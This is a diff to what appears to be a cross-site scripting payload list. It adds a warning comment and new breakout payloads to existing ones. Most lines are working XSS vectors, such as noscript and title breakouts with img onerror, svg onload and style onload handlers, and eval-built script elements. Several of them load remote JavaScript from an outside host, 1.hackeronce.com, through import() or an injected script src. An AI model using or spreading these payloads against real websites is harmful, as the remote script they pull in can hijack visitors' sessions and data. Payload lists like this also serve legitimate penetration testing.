@@ -1,3 +1,4 @@
+<!-- WARNING: This file contains active, executable XSS payloads for security testing purposes. Use with caution. -->
 <noscript><p title =" </noscript> <img src=x onerror=alert(document.domain);//“>
 
 
@@ -34,3 +35,10 @@ Create Element
 javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
 Plain JS
 document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+SVG onload payload with breakout
+"></script></title></textarea>”/><svg/onload=import('//1.hackeronce.com/jules')>
+Noscript breakout
+<noscript> <p title=” </noscript>
+Style onload payload
+<style onload= import('//1.hackeronce.com/jules')//”> *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} </style>
